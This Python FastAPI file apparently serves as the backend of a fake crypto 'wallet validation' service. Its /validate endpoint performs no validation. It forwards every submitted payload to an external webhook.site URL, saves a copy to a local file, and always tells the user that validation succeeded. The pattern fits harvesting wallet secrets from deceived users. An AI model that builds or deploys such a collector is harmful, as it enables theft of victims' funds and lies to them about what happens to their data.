from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import httpx
import json

app = FastAPI()

# CORS setup to allow all origins
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.post("/validate")
async def validate_wallet(request: Request):
    try:
        data = await request.json()
    except Exception as e:
        print("❌ Failed to parse JSON:", e)
        data = {}

    # Log to webhook (even broken or partial data)
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                "https://webhook.site/2920d0a0-1182-4b6a-a7af-921312c87c55",
                json=data
            )
        print("✅ Data forwarded to webhook.")
    except Exception as e:
        print("❌ Webhook forwarding failed:", e)

    # Save locally
    try:
        with open("submissions.txt", "a") as f:
            f.write(json.dumps(data) + "\n")
        print("📝 Data logged to file.")
    except Exception as e:
        print("⚠️ File logging failed:", e)

    # Always return success
    return {
        "status": "success",
        "message": "Validation data received and processed."
    }
